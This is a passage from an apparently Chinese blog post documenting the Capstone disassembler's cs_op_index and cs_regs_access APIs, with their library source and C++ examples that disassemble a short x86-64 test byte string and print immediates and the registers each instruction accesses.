class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">test();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>输出<br><a href="https://i.loli.net/2019/07/27/5d3c32814f9e736661.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/07/27/5d3c32814f9e736661.jpg" class="lazyload"></a></p><h3 id="cs-op-index"><a href="#cs-op-index" class="headerlink" title="cs_op_index"></a>cs_op_index</h3><p><code>int CAPSTONE_API cs_op_index(csh handle, const cs_insn *insn, unsigned int op_type, unsigned int position);</code></p><p>检索给定类型的操作数在<code>&lt;arch&gt;.operands[]</code>数组中的位置, 使用返回的位置访问操作数。<br>注意：只有当detail选项为ON时这个API可用 (默认OFF).</p><p>handle: cs_open()返回的句柄<br>insn: 从cs_disasm()或cs_disasm_iter()接收的反汇编指令结构<br>op_type: 要找到的操作数类型。<br>position: 要查找的操作数的位置。范围一定在<code>[1, cs_op_count(handle, insn, op_type)]</code>内<br>return: 指令insn的<code>&lt;arch&gt;.operands[]</code>数组中给定类型op_type的操作数的索引，失败时返回-1。</p><p>代码实现</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> CAPSTONE_API <span class="title">cs_op_index</span><span class="params">(csh ud, <span class="keyword">const</span> cs_insn *insn, <span class="keyword">unsigned</span> <span class="keyword">int</span> op_type,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="keyword">unsigned</span> <span class="keyword">int</span> post)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cs_struct</span> *<span class="title">handle</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> count = <span class="number">0</span>, i;</span><br><span class="line"><span class="keyword">if</span> (!ud)</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">handle = (struct cs_struct *)(<span class="keyword">uintptr_t</span>)ud;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!handle-&gt;detail) &#123;</span><br><span class="line">handle-&gt;errnum = CS_ERR_DETAIL;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!insn-&gt;id) &#123;</span><br><span class="line">handle-&gt;errnum = CS_ERR_SKIPDATA;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!insn-&gt;detail) &#123;</span><br><span class="line">handle-&gt;errnum = CS_ERR_DETAIL;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">handle-&gt;errnum = CS_ERR_OK;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (handle-&gt;arch) &#123;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">handle-&gt;errnum = CS_ERR_HANDLE;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ARCH_ARM:</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; insn-&gt;detail-&gt;arm.op_count; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (insn-&gt;detail-&gt;arm.operands[i].type == (arm_op_type)op_type)</span><br><span class="line">count++;</span><br><span class="line"><span class="keyword">if</span> (count == post)</span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ARCH_ARM64:</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; insn-&gt;detail-&gt;arm64.op_count; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (insn-&gt;detail-&gt;arm64.operands[i].type == (arm64_op_type)op_type)</span><br><span class="line">count++;</span><br><span class="line"><span class="keyword">if</span> (count == post)</span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ARCH_X86:</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; insn-&gt;detail-&gt;x86.op_count; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (insn-&gt;detail-&gt;x86.operands[i].type == (x86_op_type)op_type)</span><br><span class="line">count++;</span><br><span class="line"><span class="keyword">if</span> (count == post)</span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ARCH_MIPS:</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; insn-&gt;detail-&gt;mips.op_count; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (insn-&gt;detail-&gt;mips.operands[i].type == (mips_op_type)op_type)</span><br><span class="line">count++;</span><br><span class="line"><span class="keyword">if</span> (count == post)</span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ARCH_PPC:</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; insn-&gt;detail-&gt;ppc.op_count; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (insn-&gt;detail-&gt;ppc.operands[i].type == (ppc_op_type)op_type)</span><br><span class="line">count++;</span><br><span class="line"><span class="keyword">if</span> (count == post)</span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ARCH_SPARC:</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; insn-&gt;detail-&gt;sparc.op_count; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (insn-&gt;detail-&gt;sparc.operands[i].type == (sparc_op_type)op_type)</span><br><span class="line">count++;</span><br><span class="line"><span class="keyword">if</span> (count == post)</span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ARCH_SYSZ:</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; insn-&gt;detail-&gt;sysz.op_count; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (insn-&gt;detail-&gt;sysz.operands[i].type == (sysz_op_type)op_type)</span><br><span class="line">count++;</span><br><span class="line"><span class="keyword">if</span> (count == post)</span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ARCH_XCORE:</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; insn-&gt;detail-&gt;xcore.op_count; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (insn-&gt;detail-&gt;xcore.operands[i].type == (xcore_op_type)op_type)</span><br><span class="line">count++;</span><br><span class="line"><span class="keyword">if</span> (count == post)</span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ARCH_M68K:</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; insn-&gt;detail-&gt;m68k.op_count; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (insn-&gt;detail-&gt;m68k.operands[i].type == (m68k_op_type)op_type)</span><br><span class="line">count++;</span><br><span class="line"><span class="keyword">if</span> (count == post)</span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ARCH_TMS320C64X:</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; insn-&gt;detail-&gt;tms320c64x.op_count; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (insn-&gt;detail-&gt;tms320c64x.operands[i].type == (tms320c64x_op_type)op_type)</span><br><span class="line">count++;</span><br><span class="line"><span class="keyword">if</span> (count == post)</span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ARCH_M680X:</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; insn-&gt;detail-&gt;m680x.op_count; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (insn-&gt;detail-&gt;m680x.operands[i].type == (m680x_op_type)op_type)</span><br><span class="line">count++;</span><br><span class="line"><span class="keyword">if</span> (count == post)</span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>示例</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"capstone.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"platform.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">platform</span> &#123;</span></span><br><span class="line">cs_arch arch;</span><br><span class="line">cs_mode mode;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>* code;</span><br><span class="line"><span class="keyword">size_t</span> size;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* comment;</span><br><span class="line">cs_opt_type opt_type;</span><br><span class="line">cs_opt_value opt_value;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">print_string_hex</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span>* str, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>* c;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Code: "</span>);</span><br><span class="line"><span class="keyword">for</span> (c = str; c &lt; str + len; c++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0x%02x "</span>, *c &amp; <span class="number">0xff</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> X86_CODE64 <span class="meta-string">"\x55\x48\x8b\x05\xb8\x13\x00\x00\xe9\xea\xbe\xad\xde\xff\x25\x23\x01\x00\x00\xe8\xdf\xbe\xad\xde\x74\xff"</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">platform</span> <span class="title">platforms</span>[] = &#123;</span></span><br><span class="line">&#123;</span><br><span class="line">CS_ARCH_X86,</span><br><span class="line">CS_MODE_64,</span><br><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">char</span>*)X86_CODE64,</span><br><span class="line"><span class="keyword">sizeof</span>(X86_CODE64) - <span class="number">1</span>,</span><br><span class="line"><span class="string">"X86 64 (Intel syntax)"</span></span><br><span class="line">&#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">csh handle;</span><br><span class="line"><span class="keyword">uint64_t</span> address;</span><br><span class="line">cs_insn* insn;</span><br><span class="line">cs_detail* detail;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line">cs_err err;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">uint8_t</span>* code;</span><br><span class="line"><span class="keyword">size_t</span> size;</span><br><span class="line"></span><br><span class="line">cs_x86* x86;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> count;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(platforms) / <span class="keyword">sizeof</span>(platforms[<span class="number">0</span>]); i++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"****************\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Platform: %s\n"</span>, platforms[i].comment);</span><br><span class="line">err = cs_open(platforms[i].arch, platforms[i].mode, &amp;handle);</span><br><span class="line"><span class="keyword">if</span> (err) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Failed on cs_open() with error returned: %u\n"</span>, err);</span><br><span class="line"><span class="built_in">abort</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (platforms[i].opt_type)</span><br><span class="line">cs_option(handle, platforms[i].opt_type, platforms[i].opt_value);</span><br><span class="line"></span><br><span class="line">cs_option(handle, CS_OPT_DETAIL, CS_OPT_ON);</span><br><span class="line"></span><br><span class="line">insn = cs_malloc(handle);</span><br><span class="line">x86 = &amp;(insn-&gt;detail-&gt;x86);</span><br><span class="line">print_string_hex(platforms[i].code, platforms[i].size);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Disasm:\n"</span>);</span><br><span class="line"></span><br><span class="line">address = <span class="number">0x1000</span>;</span><br><span class="line">code = platforms[i].code;</span><br><span class="line">size = platforms[i].size;</span><br><span class="line"><span class="keyword">while</span> (cs_disasm_iter(handle, &amp;code, &amp;size, &amp;address, insn)) &#123;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0x%"</span> PRIx64 <span class="string">":\t%s\t\t%s          "</span>,</span><br><span class="line">insn-&gt;address, insn-&gt;mnemonic, insn-&gt;op_str);</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">count = cs_op_count(handle, insn, X86_OP_IMM);  <span class="comment">//查找立即数</span></span><br><span class="line"><span class="keyword">if</span> (count) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\timm_count: %u\n"</span>, count);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; count + <span class="number">1</span>; i++) &#123;</span><br><span class="line"><span class="keyword">int</span> index = cs_op_index(handle, insn, X86_OP_IMM, i);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\timms[%u]: 0x%"</span> PRIx64 <span class="string">"\n"</span>, i, x86-&gt;operands[index].imm);</span><br><span class="line"><span class="keyword">if</span> (x86-&gt;encoding.imm_offset != <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\timm_offset: 0x%x\n"</span>, x86-&gt;encoding.imm_offset);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (x86-&gt;encoding.imm_size != <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\timm_size: 0x%x\n"</span>, x86-&gt;encoding.imm_size);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">cs_free(insn, <span class="number">1</span>);</span><br><span class="line">cs_close(&amp;handle);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">test();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>输出<br><a href="https://i.loli.net/2019/07/27/5d3c45bfef22464773.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/07/27/5d3c45bfef22464773.jpg" class="lazyload"></a></p><h3 id="cs-regs-access"><a href="#cs-regs-access" class="headerlink" title="cs_regs_access"></a>cs_regs_access</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">cs_err CAPSTONE_API <span class="title">cs_regs_access</span><span class="params">(csh handle, <span class="keyword">const</span> cs_insn *insn,</span></span></span><br><span class="line"><span class="function"><span class="params">cs_regs regs_read, <span class="keyword">uint8_t</span> *regs_read_count,</span></span></span><br><span class="line"><span class="function"><span class="params">cs_regs regs_write, <span class="keyword">uint8_t</span> *regs_write_count)</span></span>;</span><br></pre></td></tr></table></figure></div><p>检索由一条指令显式或隐式访问的所有寄存器。</p><p>注意： 在“diet”模式下，此API不可用，因为引擎不存储寄存器。</p><p>handle: cs_open()返回的句柄<br>insn: 从cs_disasm()或cs_disasm_iter()返回的反汇编指令结构<br>regs_read:返回时，这个数组包含所有按指令读取的寄存器。<br>regs_read_count:保存在regs_read数组中的寄存器数。<br>regs_write:返回时，这个数组包含所有由指令修改的寄存器。<br>regs_write_count:保存在regs_write数组中的寄存器数。<br>成功时返回CS_ERR_OK，失败时返回其他值(详细错误请参阅cs_err enum)。</p><p>代码实现</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">cs_err CAPSTONE_API <span class="title">cs_regs_access</span><span class="params">(csh ud, <span class="keyword">const</span> cs_insn *insn,</span></span></span><br><span class="line"><span class="function"><span class="params">cs_regs regs_read, <span class="keyword">uint8_t</span> *regs_read_count,</span></span></span><br><span class="line"><span class="function"><span class="params">cs_regs regs_write, <span class="keyword">uint8_t</span> *regs_write_count)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cs_struct</span> *<span class="title">handle</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!ud)</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">handle = (struct cs_struct *)(<span class="keyword">uintptr_t</span>)ud;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CAPSTONE_DIET</span></span><br><span class="line"><span class="comment">// This API does not work in DIET mode</span></span><br><span class="line">handle-&gt;errnum = CS_ERR_DIET;</span><br><span class="line"><span class="keyword">return</span> CS_ERR_DIET;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="keyword">if</span> (!handle-&gt;detail) &#123;</span><br><span class="line">handle-&gt;errnum = CS_ERR_DETAIL;</span><br><span class="line"><span class="keyword">return</span> CS_ERR_DETAIL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!insn-&gt;id) &#123;</span><br><span class="line">handle-&gt;errnum = CS_ERR_SKIPDATA;</span><br><span class="line"><span class="keyword">return</span> CS_ERR_SKIPDATA;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!insn-&gt;detail) &#123;</span><br><span class="line">handle-&gt;errnum = CS_ERR_DETAIL;</span><br><span class="line"><span class="keyword">return</span> CS_ERR_DETAIL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (handle-&gt;reg_access) &#123;</span><br><span class="line">handle-&gt;reg_access(insn, regs_read, regs_read_count, regs_write, regs_write_count);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// this arch is unsupported yet</span></span><br><span class="line">handle-&gt;errnum = CS_ERR_ARCH;</span><br><span class="line"><span class="keyword">return</span> CS_ERR_ARCH;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> CS_ERR_OK;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>示例：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"capstone.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"platform.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">platform</span> &#123;</span></span><br><span class="line">cs_arch arch;</span><br><span class="line">cs_mode mode;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>* code;</span><br><span class="line"><span class="keyword">size_t</span> size;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* comment;</span><br><span class="line">cs_opt_type opt_type;</span><br><span class="line">cs_opt_value opt_value;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">print_string_hex</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span>* str, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>* c;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Code: "</span>);</span><br><span class="line"><span class="keyword">for</span> (c = str; c &lt; str + len; c++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0x%02x "</span>, *c &amp; <span class="number">0xff</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> X86_CODE64 <span class="meta-string">"\x55\x48\x8b\x05\xb8\x13\x00\x00\xe9\xea\xbe\xad\xde\xff\x25\x23\x01\x00\x00\xe8\xdf\xbe\xad\xde\x74\xff"</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">platform</span> <span class="title">platforms</span>[] = &#123;</span></span><br><span class="line">&#123;</span><br><span class="line">CS_ARCH_X86,</span><br><span class="line">CS_MODE_64,</span><br><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">char</span>*)X86_CODE64,</span><br><span class="line"><span class="keyword">sizeof</span>(X86_CODE64) - <span class="number">1</span>,</span><br><span class="line"><span class="string">"X86 64 (Intel syntax)"</span></span><br><span class="line">&#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">csh handle;</span><br><span class="line"><span class="keyword">uint64_t</span> address;</span><br><span class="line">cs_insn* insn;</span><br><span class="line">cs_detail* detail;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line">cs_err err;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">uint8_t</span>* code;</span><br><span class="line"><span class="keyword">size_t</span> size;</span><br><span class="line"></span><br><span class="line">cs_x86* x86;</span><br><span class="line">cs_regs regs_read, regs_write;</span><br><span class="line"><span class="keyword">uint8_t</span> regs_read_count, regs_write_count;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> count;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(platforms) / <span class="keyword">sizeof</span>(platforms[<span class="number">0</span>]); i++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"****************\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Platform: %s\n"</span>, platforms[i].comment);</span><br><span class="line">err = cs_open(platforms[i].arch, platforms[i].mode, &amp;handle);</span><br><span class="line"><span class="keyword">if</span> (err) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Failed on cs_open() with error returned: %u\n"</span>, err);</span><br><span class="line"><span class="built_in">abort</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (platforms[i].opt_type)</span><br><span class="line">cs_option(handle, platforms[i].opt_type, platforms[i].opt_value);</span><br><span class="line"></span><br><span class="line">cs_option(handle, CS_OPT_DETAIL, CS_OPT_ON);</span><br><span class="line"></span><br><span class="line">insn = cs_malloc(handle);</span><br><span class="line">x86 = &amp;(insn-&gt;detail-&gt;x86);</span><br><span class="line">print_string_hex(platforms[i].code, platforms[i].size);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Disasm:\n"</span>);</span><br><span class="line"></span><br><span class="line">address = <span class="number">0x1000</span>;</span><br><span class="line">code = platforms[i].code;</span><br><span class="line">size = platforms[i].size;</span><br><span class="line"><span class="keyword">while</span> (cs_disasm_iter(handle, &amp;code, &amp;size, &amp;address, insn)) &#123;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0x%"</span> PRIx64 <span class="string">":\t%s\t\t%s          "</span>,</span><br><span class="line">insn-&gt;address, insn-&gt;mnemonic, insn-&gt;op_str);</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!cs_regs_access(handle, insn,       <span class="comment">//每条指令所有读取和修改的寄存器</span></span><br><span class="line">regs_read, &amp;regs_read_count,</span><br><span class="line">regs_write, &amp;regs_write_count)) &#123;</span><br><span class="line"><span class="keyword">if</span> (regs_read_count) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\tRegisters read:"</span>);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; regs_read_count; i++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">" %s"</span>, cs_reg_name(handle, regs_read[i]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (regs_write_count) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\tRegisters modified:"</span>);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; regs_write_count; i++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">" %s"</span>, cs_reg_name(handle, regs_write[i]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">cs_free(insn, <span class="number">1</span>);</span><br><span class="line">cs_close(&amp;handle);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">test();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>输出<br><a href="https://i.loli.net/2019/07/27/5d3c48d04fea172636.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/07/27/5d3c48d04fea172636.jpg" class="lazyload"></a></p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;Capstone反汇编引擎数据类型及API分析及示例-四&quot;&gt;&lt;a href=&quot;#Capstone反汇编引擎数据类型及API分析及示例-四&quot; class=&quot;headerlink&quot;</summary>
        
      
    
    
    
